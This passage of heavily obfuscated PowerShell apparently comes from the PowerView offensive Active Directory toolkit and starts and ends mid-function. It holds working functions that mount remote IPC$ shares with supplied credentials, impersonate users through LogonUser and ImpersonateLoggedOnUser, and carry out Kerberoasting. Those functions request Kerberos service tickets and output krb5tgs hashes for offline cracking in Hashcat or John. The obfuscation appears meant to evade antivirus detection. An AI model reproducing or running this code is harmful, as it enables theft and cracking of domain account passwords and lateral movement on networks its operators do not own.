                if ( (${V`Al`UE} -band ${u`Ac`V`ALuE}."va`LUE") -eq ${UaCVA`l`Ue}."Va`LuE") {
                    ${REs`U`LTuAcV`AL`UEs}.("{0}{1}"-f 'A','dd').Invoke(${U`ACv`AluE}."Na`me", "$($UACValue.Value)+")
                }
                else {
                    ${ReSULTuaC`VAlU`eS}.("{1}{0}"-f 'dd','A').Invoke(${u`A`CV`Alue}."n`AME", "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${U`A`cVALuE} in ${u`A`CVA`LueS}.("{0}{1}{3}{2}{4}"-f 'G','et','numerat','E','or').Invoke()) {
                if ( (${V`Al`Ue} -band ${uaC`V`ALue}."Va`lue") -eq ${uAc`V`Alue}."VaL`UE") {
                    ${REs`UlTuac`V`A`lUeS}.("{1}{0}"-f 'd','Ad').Invoke(${uacva`l`UE}."na`me", "$($UACValue.Value)")
                }
            }
        }
        ${REs`UlTUAC`Val`UeS}
    }
}

function Ge`T-`pRInciPaLC`Ont`eXt {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{4}{2}" -f 'PSShoul','dP','ss','roc','e'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(posItIon = 0, MaNdAtOrY = ${T`Rue})]
        [Alias({"{2}{0}{1}" -f 'roup','Name','G'}, {"{2}{1}{0}{3}" -f 'entit','d','GroupI','y'})]
        [String]
        ${i`DENT`ItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`AiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDe`NT`Ial} =  (  &("{1}{0}"-f'ItEm','gET-')  ("vA"+"RI"+"ablE:P"+"Kf"+"EzN") )."V`AluE"::"em`PTY"
    )

    &("{1}{0}{2}"-f 'd','A','d-Type') -AssemblyName ("{6}{9}{8}{1}{10}{3}{4}{7}{2}{11}{0}{5}" -f 'geme','.Di','ountMan','ectoryS','er','nt','Sys','vices.Acc','m','te','r','a')

    try {
        if (${P`SbOuNdPA`RaM`EtE`Rs}[("{1}{0}"-f'ain','Dom')] -or (${iDe`N`TiTY} -match ((("{0}{1}" -f '.+uWOuWO.','+'))."RePl`ACE"(([CHAr]117+[CHAr]87+[CHAr]79),[stRing][CHAr]92)))) {
            if (${iden`Ti`Ty} -match ((("{1}{3}{0}{2}"-f 'ydgydg','.','.+','+')) -rEpLAce([CHaR]121+[CHaR]100+[CHaR]103),[CHaR]92)) {

                ${cON`Ve`RtEDide`NTitY} = ${Ident`Ity} | &("{3}{0}{2}{4}{1}" -f 'nv','me','e','Co','rt-ADNa') -OutputType ("{0}{1}"-f'Canon','ical')
                if (${conVe`R`TEDI`dE`Nt`Ity}) {
                    ${cON`NECt`T`ARgEt} = ${Co`NvE`RT`e`DId`enTItY}.("{0}{1}{2}" -f 'Sub','Str','ing').Invoke(0, ${C`o`NVeRTedID`ENtiTY}.("{1}{0}{2}" -f'x','Inde','Of').Invoke('/'))
                    ${o`BJ`ecTIdeNT`ITY} = ${i`d`EnT`ity}.("{0}{1}" -f 'Spli','t').Invoke('\')[1]
                    &("{2}{1}{0}"-f 'Verbose','e-','Writ') ('[Ge'+'t'+'-Pri'+'ncipalContext]'+' '+'B'+'indi'+'ng '+'t'+'o '+'dom'+'ain '+"'$ConnectTarget'")
                }
            }
            else {
                ${o`BJ`eCtI`DeN`Tity} = ${id`Entity}
                &("{2}{0}{1}" -f 'ite-','Verbose','Wr') ('[Ge'+'t-'+'Pri'+'ncipa'+'lCont'+'ext] '+'B'+'in'+'ding '+'to'+' '+'dom'+'ain '+"'$Domain'")
                ${Co`NNecT`Target} = ${DOm`AIn}
            }

            if (${PSBo`UN`dPa`R`AMete`Rs}[("{2}{0}{1}" -f'den','tial','Cre')]) {
                &("{0}{1}{2}"-f'Wr','ite-Ver','bose') ("{6}{7}{5}{4}{10}{9}{3}{2}{1}{8}{0}"-f 'als','te cre','erna','ng alt','C','ncipal','[Get-P','ri','denti','t] Usi','ontex')
                ${C`ONte`xT} = &("{2}{1}{3}{0}" -f't','bj','New-O','ec') -TypeName ("{9}{1}{3}{2}{8}{5}{10}{11}{7}{6}{4}{0}" -f 'xt','tem','torySe','.Direc','rincipalConte','v','nt.P','eme','r','Sys','ices.','AccountManag') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"doM`AiN", ${conneCT`T`ARget}, ${creDe`N`Ti`Al}."USERnA`Me", ${CrE`deN`T`iaL}.("{0}{3}{1}{4}{5}{2}" -f 'Ge','r','al','tNetworkC','ed','enti').Invoke()."pA`sswO`RD")
            }
            else {
                ${C`ONTe`xT} = &("{2}{0}{1}" -f'-O','bject','New') -TypeName ("{0}{7}{4}{10}{8}{5}{12}{11}{9}{2}{13}{6}{1}{3}{14}"-f 'Sy','ncipa','e','lConte','DirectoryS','ices.A','ri','stem.','rv','m','e','ountManage','cc','nt.P','xt') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"dO`mAIn", ${cO`Nn`e`CT`TargeT})
            }
        }
        else {
            if (${P`sbou`N`Dp`ARamEteRs}[("{1}{2}{0}"-f 'tial','Cr','eden')]) {
                &("{0}{2}{3}{1}"-f'Writ','se','e-Verb','o') ("{13}{11}{8}{4}{3}{7}{1}{2}{10}{0}{14}{9}{5}{6}{12}" -f ' alte','xt','] Usi','C','ipal','redent','ia','onte','c','nate c','ng','rin','ls','[Get-P','r')
                ${DOmAI`NN`A`me} = &("{0}{2}{1}"-f 'Get','ain','-Dom') | &("{1}{0}{2}"-f't-O','Selec','bject') -ExpandProperty ("{1}{0}" -f'ame','N')
                ${c`oNtE`xT} = &("{1}{2}{0}" -f 't','New','-Objec') -TypeName ("{8}{5}{6}{0}{4}{1}{7}{2}{9}{3}"-f'ryServic','Ac','ount','lContext','es.','m','.Directo','c','Syste','Management.Principa') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"D`O`MAIN", ${D`Om`AiN`NAMe}, ${cr`e`DenT`iAl}."uSern`Ame", ${C`ReDE`NtI`Al}.("{0}{5}{4}{2}{1}{3}" -f 'GetNetwor','eden','r','tial','C','k').Invoke()."pA`SS`wOrD")
            }
            else {
                ${C`O`NteXT} = &("{2}{0}{1}{3}"-f '-','Ob','New','ject') -TypeName ("{1}{6}{10}{8}{3}{0}{2}{5}{9}{4}{7}{11}" -f'.Ac','Sys','countMa','s','ment.Principa','n','tem.Direct','lContex','ervice','age','oryS','t') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"d`O`MAIn")
            }
            ${oBjeCtId`E`Nt`ItY} = ${I`DE`NTITY}
        }

        ${o`Ut} = &("{0}{1}{2}{3}" -f 'N','ew-Obj','e','ct') ("{2}{1}{0}"-f 't','bjec','PSO')
        ${O`UT} | &("{1}{2}{0}" -f 'ber','Add-','Mem') ("{1}{3}{0}{2}"-f'p','N','roperty','ote') ("{1}{2}{0}" -f'ext','Co','nt') ${cOn`T`Ext}
        ${o`Ut} | &("{1}{2}{0}" -f'r','Add-','Membe') ("{2}{1}{3}{0}" -f'rty','tepr','No','ope') ("{0}{1}"-f'Ide','ntity') ${oB`j`EcTI`DEn`TItY}
        ${O`UT}
    }
    catch {
        &("{2}{0}{1}"-f 'te-Warnin','g','Wri') ('[G'+'e'+'t-Pr'+'inc'+'ipal'+'Conte'+'xt]'+' '+'Err'+'or'+' '+'cre'+'atin'+'g '+'bin'+'di'+'ng '+'f'+'or '+'o'+'bject '+"('$Identity') "+'conte'+'xt '+': '+"$_")
    }
}

function a`dD`-ReMO`T`ECoNNe`ction {

    [CmdletBinding(DeFaulTParAMeTErseTNAMe = {"{2}{0}{3}{1}"-f 'pu','me','Com','terNa'})]
    Param(
        [Parameter(poSitiOn = 0, maNdAToRy = ${tR`Ue}, ParamETersEtnAME = "cO`MPute`RNaMe", vAluefROMPIpeLine = ${tr`Ue}, valuefrOmpipElinEbYpRoPERtYNAme = ${t`RUe})]
        [Alias({"{2}{1}{0}" -f'me','Na','Host'}, {"{0}{1}{2}" -f'dnshost','na','me'}, {"{1}{0}" -f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OmPu`TER`NAmE},

        [Parameter(POSitIon = 0, pARAMEterSEtNAme = "P`Ath", manDaTOry = ${Tr`Ue})]
        [ValidatePattern({(("{4}{3}{0}{2}{1}"-f'X86X8','.*','.*6X86X8','86X86','6X'))-cRepLaCe([cHAr]54+[cHAr]88+[cHAr]56),[cHAr]92})]
        [String[]]
        ${p`ATH},

        [Parameter(MAndAtORy = ${t`RUe})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`DEntiAl}
    )

    BEGIN {
        ${nE`TReSOuRCE`i`NSt`ANce} =  ${Q`k2}::("{1}{0}{2}"-f'rea','C','teInstance').Invoke(${NeTRe`s`OUR`cew})
        ${neT`ReSoU`R`C`eInstaN`ce}."D`W`TYpE" = 1
    }

    PROCESS {
        ${P`AT`Hs} = @()
        if (${pSBoU`Nd`paRamETE`RS}[("{1}{0}{2}{3}"-f 'pu','Com','terNa','me')]) {
            ForEach (${t`Ar`G`etcoMpUt`E`RNamE} in ${COmpu`TE`Rname}) {
                ${tA`RGETC`omp`UTErNA`me} = ${tA`R`getC`o`mPUTERN`AME}.("{1}{0}"-f'm','Tri').Invoke('\')
                ${pa`T`Hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${PAt`HS} += ,${Pa`Th}
        }

        ForEach (${TA`RgETPa`Th} in ${Pat`hs}) {
            ${NETR`ESOu`R`ceIn`STaNcE}."lP`REm`o`TEnaME" = ${T`ArgEt`p`ATH}
            &("{2}{3}{0}{1}" -f'-Verbo','se','Wri','te') ('['+'Add-Re'+'moteConne'+'ctio'+'n]'+' '+'Att'+'em'+'ptin'+'g '+'t'+'o '+'moun'+'t:'+' '+"$TargetPath")

            ${RES`UlT} = ${M`Pr}::("{0}{4}{5}{1}{3}{2}" -f 'WNetAddCo','e','2W','ction','n','n').Invoke(${NEtres`O`U`Rce`INSTaN`Ce}, ${CreDE`N`TiAl}.("{3}{1}{2}{4}{0}" -f 'ntial','Network','Cr','Get','ede').Invoke()."Pa`ssW`Ord", ${c`REd`En`TIaL}."U`sern`AMe", 4)

            if (${R`Es`ULt} -eq 0) {
                &("{1}{3}{0}{2}"-f '-V','Writ','erbose','e') ("$TargetPath "+'succ'+'es'+'sfu'+'lly '+'mou'+'nt'+'ed')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}

function R`EM`ovE-`REmotecoNnec`Tion {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{1}{6}{9}{2}{7}{8}{0}{3}{4}"-f'gingFun','UseSh','ocessForSt','cti','ons','PS','ouldP','ateCh','an','r'}, '')]
    [CmdletBinding(DEFaulTParAmEteRsetnAME = {"{0}{3}{1}{2}"-f 'C','puterNam','e','om'})]
    Param(
        [Parameter(PoSiTiOn = 0, MAnDatORy = ${tr`UE}, paRamETERSETnAME = "Compu`Te`RnamE", vaLuEfROmpIpeLine = ${tr`UE}, VALuefrOMpiPElINebYPropErTyname = ${t`RUE})]
        [Alias({"{2}{0}{1}"-f 'am','e','HostN'}, {"{1}{2}{0}" -f 'name','dnsho','st'}, {"{1}{0}"-f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oM`pUter`NaMe},

        [Parameter(PoSITIOn = 0, paramETErSeTnamE = "P`ATH", mandAtOrY = ${TR`Ue})]
        [ValidatePattern({(("{2}{4}{0}{3}{1}"-f 'fyr','yr.*','fyrfy','.*fyrf','rfyr'))."R`epLace"(([CHAR]102+[CHAR]121+[CHAR]114),[STriNG][CHAR]92)})]
        [String[]]
        ${p`AtH}
    )

    PROCESS {
        ${pAT`Hs} = @()
        if (${pSBOun`dpA`R`AMETE`RS}[("{2}{3}{1}{0}"-f'me','a','Compute','rN')]) {
            ForEach (${ta`RGet`COmP`U`Te`RName} in ${C`OMPut`erNa`mE}) {
                ${TaR`GEtco`M`p`UTerNAME} = ${taR`Getc`Om`PuTE`RnAme}.("{0}{1}" -f 'T','rim').Invoke('\')
                ${pa`Ths} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${PaT`HS} += ,${P`AtH}
        }

        ForEach (${t`Arge`T`paTh} in ${p`ATHs}) {
            &("{2}{0}{4}{1}{3}" -f 'ite-V','o','Wr','se','erb') ('[Re'+'mov'+'e-RemoteConn'+'ec'+'ti'+'on] '+'A'+'ttemp'+'ti'+'ng '+'t'+'o '+'unmo'+'un'+'t'+': '+"$TargetPath")
            ${Re`S`Ult} = ${M`PR}::("{1}{2}{4}{5}{0}{3}{6}" -f'ct','W','NetCa','ion','ncelCon','ne','2').Invoke(${tarGe`T`PaTh}, 0, ${t`RUE})

            if (${r`esU`lt} -eq 0) {
                &("{2}{1}{0}{3}"-f'te-','i','Wr','Verbose') ("$TargetPath "+'su'+'cces'+'sfull'+'y'+' '+'ummoun'+'te'+'d')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}

function invOk`e-us`Erimper`S`o`NAtIOn {

    [OutputType([IntPtr])]
    [CmdletBinding(dEFaUltPARAMeTERSETNamE = {"{2}{1}{0}" -f 'dential','e','Cr'})]
    Param(
        [Parameter(maNDaTORY = ${tR`Ue}, PaRaMEteRSEtNAme = "CRE`deN`TIal")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`EnT`iAl},

        [Parameter(MaNdaTORY = ${T`RuE}, paraMETERSEtName = "ToKEnHa`N`DlE")]
        [ValidateNotNull()]
        [IntPtr]
        ${t`oKEnhand`LE},

        [Switch]
        ${Q`Ui`Et}
    )

    if (( ${F`4Lx}::"C`URREntT`hREad".("{2}{0}{3}{4}{1}" -f'partm','e','GetA','en','tStat').Invoke() -ne 'STA') -and (-not ${PSb`o`Undp`AramET`eRs}[("{1}{0}"-f'et','Qui')])) {
        &("{3}{1}{0}{2}" -f'i','rn','ng','Write-Wa') ("{16}{3}{14}{18}{5}{4}{1}{0}{25}{20}{21}{15}{8}{26}{6}{10}{22}{9}{19}{11}{23}{13}{24}{27}{2}{17}{7}{12}"-f'n','rso',', token ','I','erImpe','s','ot c','nation may not wor','xe ','gle','urrent',' apa','k.','tment','nvoke-','l.e','[','imperso','U','-threaded','on] power','shel','ly in a sin','r',' stat','ati','is n','e')
    }

    if (${psb`OU`N`d`pArAmETERs}[("{0}{1}{2}"-f'TokenH','a','ndle')]) {
        ${l`oGON`T`okENHa`NDlE} = ${To`k`eNHAndle}
    }
    else {
        ${L`o`Gont`OKEn`HA`NDle} =  (&("{3}{1}{2}{0}"-f'BlE','-V','ARIA','gEt') ("{0}{1}" -f 'HdI','cu')  -VALUe )::"Ze`Ro"
        ${ne`TwoRk`CREdEn`Ti`AL} = ${cred`EnT`Ial}.("{1}{0}{2}{3}{4}" -f 'etNe','G','tworkCredent','i','al').Invoke()
        ${uSE`Rd`oMA`In} = ${N`et`WOrkCreden`Ti`AL}."doM`Ain"
        ${U`SeRNA`mE} = ${Net`W`OrkCrEDE`NT`iaL}."u`SERNAme"
        &("{0}{2}{1}" -f 'Writ','ing','e-Warn') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        ${rE`s`ULt} = ${Ad`V`Api32}::("{0}{1}{2}" -f'Log','on','User').Invoke(${usERna`ME}, ${U`se`RDO`MaIn}, ${neTwOrK`cR`eDEN`TI`Al}."paSS`Word", 9, 3, [ref]${loGONt`Ok`Enha`NdlE});${LA`stE`RrOR} =  (  &("{0}{2}{1}" -f'GeT-var','lE','IAB')  ("1t2"+"n") -vaLuEONL)::("{3}{2}{1}{0}" -f'r','n32Erro','tLastWi','Ge').Invoke();

        if (-not ${R`ES`UlT}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    ${REs`ULT} = ${AD`V`ApI32}::("{0}{3}{1}{2}"-f 'Impe','nateLo','ggedOnUser','rso').Invoke(${loGO`NTO`K`En`HAndle})

    if (-not ${re`sult}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{2}{3}{1}{0}"-f'e','erbos','W','rite-V') ("{19}{21}{17}{6}{16}{2}{10}{0}{11}{7}{9}{12}{13}{8}{5}{1}{3}{18}{14}{15}{20}{4}" -f 'er','uc','t','cessf','ed','s','p','credent','s ','i','ion] Alt','nate ','a','l','y',' i','ersona','Im','ull','[Invok','mpersonat','e-User')
    ${LoG`onTO`KEnh`A`Nd`lE}
}

function in`V`Ok`E-revE`RttosE`lF {

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${t`Oke`NhAnDLE}
    )

    if (${P`S`BOundpARA`mETERs}[("{0}{2}{1}"-f'Token','le','Hand')]) {
        &("{2}{3}{4}{1}{0}" -f 'g','in','Write-W','ar','n') (("{4}{1}{13}{2}{6}{12}{3}{19}{5}{15}{7}{21}{9}{18}{16}{20}{10}{11}{22}{0}{17}{14}{8}"-f')','vertToSelf] ','ve',' ','[Invoke-Re','en impe','rtin','so','n handle','ation a','nU','s','g','Re','ke','r','closing L',' to','nd ','tok','ogo','n','er('))
        ${Resu`LT} = ${kEr`Ne`l32}::("{1}{0}{2}{3}" -f 'loseHa','C','nd','le').Invoke(${To`KENHa`N`DLe})
    }

    ${Re`sU`lt} = ${ADv`API32}::("{2}{1}{0}{3}"-f 'tToSel','ver','Re','f').Invoke();${l`Ast`ErroR} =   ${1`T2N}::("{3}{4}{2}{0}{1}" -f'r','ror','tWin32E','Ge','tLas').Invoke();

    if (-not ${RESu`Lt}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{2}{1}{0}"-f'e','os','Write-Verb') ("{12}{3}{11}{0}{1}{5}{7}{9}{13}{2}{4}{10}{8}{6}"-f 'ertToSe','lf] ',' successfully','ke-Re',' ','T','ed','oken imperso','t','n','rever','v','[Invo','ation')
}

function geT-dOMAi`NSP`NTIc`ket {

    [OutputType({"{2}{3}{4}{0}{1}"-f'PN','Ticket','Po','wer','View.S'})]
    [CmdletBinding(dEfAulTpARamETERSETnAme = {"{0}{1}" -f 'RawS','PN'})]
    Param (
        [Parameter(poSiTion = 0, paRAmETersEtNAMe = "r`A`Wspn", maNDaToRY = ${TR`UE}, VAlUefROmPIPeLIne = ${TR`UE})]
        [ValidatePattern({"{1}{0}" -f '/.*','.*'})]
        [Alias({"{3}{2}{1}{4}{0}"-f'me','cePrincipalN','rvi','Se','a'})]
        [String[]]
        ${S`Pn},

        [Parameter(pOSiTION = 0, pAramETerseTNAme = "u`seR", mandaTORY = ${t`Rue}, valUEfrompipeLiNE = ${tr`UE})]
        [ValidateScript({ ${_}."PsOBj`E`Ct"."T`YpENam`eS"[0] -eq ("{3}{1}{2}{0}"-f'r','rView.','Use','Powe') })]
        [Object[]]
        ${US`eR},

        [ValidateSet({"{1}{0}"-f'hn','Jo'}, {"{0}{1}" -f 'H','ashcat'})]
        [Alias({"{0}{1}"-f'F','ormat'})]
        [String]
        ${OUTputf`O`RMaT} = ("{2}{1}{0}" -f 't','ca','Hash'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Reden`TIAL} =  (  &("{1}{0}"-f 'arIaBLE','V') ("{0}{1}" -f 'pKF','EZN')  )."vA`LuE"::"E`Mpty"
    )

    BEGIN {
        ${n`UlL} =  (  &("{1}{2}{0}"-f'IabLE','Va','R')  ("shcy"+"l1")  )."vA`lue"::("{4}{3}{1}{2}{0}"-f 'me','tialN','a','hPar','LoadWit').Invoke(("{2}{4}{5}{3}{1}{0}" -f'l','yMode','Syste','t','m','.Identi'))

        if (${PSBouNdp`AR`A`ME`TeRs}[("{1}{2}{0}"-f'tial','Crede','n')]) {
            ${LO`gO`N`TokEn} = &("{0}{2}{4}{5}{1}{3}" -f 'In','erso','vok','nation','e-UserI','mp') -Credential ${CReDEnT`I`Al}
        }
    }

    PROCESS {
        if (${P`sb`oundP`ArAMetE`RS}[("{0}{1}" -f 'Use','r')]) {
            ${ta`R`GEtoB`J`ecT} = ${u`Ser}
        }
        else {
            ${targeTo`B`Ject} = ${S`pN}
        }

        ForEach (${o`Bj`ecT} in ${TaRgE`ToBj`ECt}) {
            if (${PS`Bo`UND`PaRa`MeT`ERs}[("{0}{1}"-f'Us','er')]) {
                ${U`sERsPN} = ${obj`ect}."Ser`V`iCEPrINCipal`Name"
                ${sA`MaC`c`OUnTNaME} = ${OBJE`CT}."sama`CC`oUN`TnA`me"
                ${dIS`TI`Ng`UIshe`DN`AMe} = ${OB`j`EcT}."D`i`StIng`U`ishe`DNAme"
            }
            else {
                ${u`seRS`Pn} = ${O`B`Ject}
                ${samACC`OUn`Tn`A`ME} = ("{0}{2}{1}"-f'U','KNOWN','N')
                ${Dis`TIngUis`H`EdnAme} = ("{1}{0}"-f'NKNOWN','U')
            }

            if (${U`sE`RsPN} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${use`R`SPN} = ${USers`pn}[0]
            }

            try {
                ${tiCk`Et} = &("{3}{0}{1}{2}"-f 'w-Obj','ec','t','Ne') ("{1}{3}{9}{5}{7}{2}{4}{6}{8}{0}"-f 'yToken','System.Identity','sR','M','equestor','l','Se','.Tokens.Kerbero','curit','ode') -ArgumentList ${US`eRs`pN}
            }
            catch {
                &("{3}{1}{0}{2}" -f 'arn','ite-W','ing','Wr') ('[Get-Doma'+'i'+'nSP'+'NTi'+'c'+'ket] '+'Er'+'ror '+'req'+'ues'+'ting '+'tic'+'ket '+'for'+' '+'SP'+'N '+"'$UserSPN' "+'f'+'rom '+'u'+'ser '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${Tic`K`ET}) {
                ${T`ICkEtBY`TEsT`REAm} = ${tick`eT}.("{2}{1}{0}"-f 'st','ue','GetReq').Invoke()
            }
            if (${TIc`kETbyt`EStr`EAM}) {
                ${O`Ut} = &("{0}{1}{2}"-f'New-Obj','ec','t') ("{0}{1}" -f 'PS','Object')

                ${tiC`KE`THE`XST`ReAm} =   ${JC`6`1d}::("{1}{2}{0}"-f'ng','ToStr','i').Invoke(${t`i`CkEt`BytesTRe`AM}) -replace '-'

                ${O`UT} | &("{1}{0}{2}"-f'dd','A','-Member') ("{1}{0}{2}{3}"-f'p','Note','ro','perty') ("{1}{2}{0}{3}" -f'oun','SamAc','c','tName') ${sAM`ACc`ouNtn`AmE}
                ${O`UT} | &("{0}{1}{2}{3}"-f'Ad','d','-Membe','r') ("{0}{2}{1}"-f 'N','operty','otepr') ("{0}{2}{1}{3}{4}{5}"-f'D','inguish','ist','ed','N','ame') ${diStI`Ng`UIsHEDn`AmE}
                ${O`Ut} | &("{1}{3}{0}{2}" -f'-M','Ad','ember','d') ("{2}{0}{1}"-f 'o','perty','Notepr') ("{3}{0}{2}{1}" -f 'rvice','me','PrincipalNa','Se') ${t`ic`KET}."s`ERVicE`Pr`inciPalN`AME"

                if(${TicKEThE`X`Str`e`Am} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${E`Ty`PE} =   ( &('LS') ('vARIab'+'lE:'+'E'+'6a0')  )."v`Alue"::("{1}{0}" -f 'te','ToBy').Invoke( ${M`Atc`HES}."ETYPeL`eN", 16 )
                    ${ciPhE`RTe`xtlEn} =  ${e`6a0}::("{2}{0}{1}" -f'In','t32','ToU').Invoke(${MAT`c`hes}."c`iPHErTEXtL`En", 16)-4
                    ${CiP`HERt`Ext} = ${mAtC`H`Es}."DatA`T`OEnd".("{2}{1}{0}" -f 'ring','st','Sub').Invoke(0,${C`ip`HE`RTEx`TLen}*2)

                    if(${Ma`T`CHes}."datA`Toend".("{1}{2}{0}"-f'ing','Sub','str').Invoke(${CipH`er`TeXtLEn}*2, 4) -ne ("{0}{1}"-f'A4','82')) {
                        &("{1}{3}{2}{0}" -f'ng','Write-','i','Warn') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        ${h`ASH} = ${NU`Ll}
                        ${O`UT} | &("{1}{0}{2}" -f 'd-Me','Ad','mber') ("{1}{0}{2}" -f 'eprope','Not','rty') ("{5}{0}{4}{3}{2}{1}"-f'tB','am','e','xStr','yteHe','Ticke') ( ${q6`R`hsU}::("{0}{2}{1}" -f'T','String','o').Invoke(${TIcK`etBY`Test`REAm}).("{1}{0}" -f 'place','Re').Invoke('-',''))
                    } else {
                        ${ha`SH} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${O`UT} | &("{2}{0}{1}"-f'Me','mber','Add-') ("{2}{1}{0}" -f 'rty','oteprope','N') ("{3}{0}{2}{1}{5}{4}" -f'Byt','exSt','eH','Ticket','m','rea') ${nU`lL}
                    }
                } else {
                    &("{1}{2}{0}" -f 'ing','Write-W','arn') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${h`ASH} = ${n`ULl}
                    ${o`UT} | &("{0}{1}{2}"-f'Add-M','e','mber') ("{3}{1}{0}{2}"-f'ep','t','roperty','No') ("{0}{3}{1}{2}"-f 'Ti','tB','yteHexStream','cke') (  (  &("{1}{0}" -f 'ci','g') ("vAR"+"IaBLE:Q"+"6r"+"HSU")  )."vA`LUE"::("{1}{0}{2}" -f'oStrin','T','g').Invoke(${Tic`k`Etb`YT`ESTrE`Am}).("{0}{1}" -f 'Repl','ace').Invoke('-',''))
                }

                if(${Ha`Sh}) {

                    if (${O`Utput`F`ORm`At} -match ("{1}{0}" -f 'hn','Jo')) {
                        ${H`A`shF`OrMAT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${DI`STINgUi`SH`EDNA`Me} -ne ("{1}{0}{2}"-f 'N','UNK','OWN')) {
                            ${U`SEr`doM`Ain} = ${disTiNGU`isHeD`Na`Me}.("{0}{2}{1}" -f 'Sub','ing','Str').Invoke(${D`i`sT`INguIs`HEdNA`Me}.("{1}{0}"-f'dexOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${us`ErdO`M`AiN} = ("{1}{0}{2}" -f 'K','UN','NOWN')
                        }

                        ${hAS`hf`oRm`AT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`UT} | &("{0}{2}{1}"-f 'Add-Mem','er','b') ("{0}{3}{1}{2}"-f 'No','prope','rty','te') ("{1}{0}"-f 'ash','H') ${Has`Hfo`Rm`At}
                }

                ${o`Ut}."psobJe`Ct"."tYP`eNam`eS".("{2}{1}{0}" -f 'rt','nse','I').Invoke(0, ("{1}{0}{4}{5}{3}{2}"-f'rVi','Powe','et','Tick','ew.','SPN'))
                ${O`UT}
            }
        }
    }

    END {
        if (${lo`GoNT`Ok`eN}) {
            &("{6}{2}{1}{4}{0}{3}{5}"-f'-Rever','vok','n','tToSe','e','lf','I') -TokenHandle ${LOG`oN`TOk`en}
        }
    }
}

function i`NVok`e`-KeRBer`oaST {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{1}{0}"-f 'ss','roce','ld','P','PSShou'}, '')]
    [OutputType({"{3}{1}{0}{2}" -f 'werView.SPNTic','o','ket','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItIOn = 0, VaLueFRomPiPeLInE = ${TR`Ue}, vAlUEfROmPIpELInebyPROpErTynAME = ${Tr`UE})]
        [Alias({"{3}{0}{1}{2}"-f'shed','Nam','e','Distingui'}, {"{0}{2}{3}{1}" -f'SamAccou','Name','n','t'}, {"{1}{0}"-f 'ame','N'}, {"{1}{4}{5}{2}{0}{3}" -f'edNa','MemberDi','inguish','me','s','t'}, {"{0}{2}{1}"-f'Mem','rName','be'})]
        [String[]]
        ${IdeNt`ITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMa`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ter','Fil'})]
        [String]
        ${ld`APF`IL`TER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'SPath','AD'})]
        [String]
        ${Se`Ar`Chb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'nCo','ntroller','Domai'})]
        [String]
        ${S`ERveR},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{1}{2}{0}" -f'evel','O','neL'}, {"{1}{0}" -f'ee','Subtr'})]
        [String]
        ${s`eARchS`cO`Pe} = ("{0}{1}"-f 'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SulT`Pa`gEsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`Rve`RtIM`eli`mIT},

        [Switch]
        ${T`o`MbStonE},

        [ValidateSet({"{0}{1}" -f 'Joh','n'}, {"{0}{1}"-f 'Hashca','t'})]
        [Alias({"{1}{0}{2}" -f'o','F','rmat'})]
        [String]
        ${oUT`puTfO`Rm`At} = ("{1}{2}{0}"-f'shcat','H','a'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
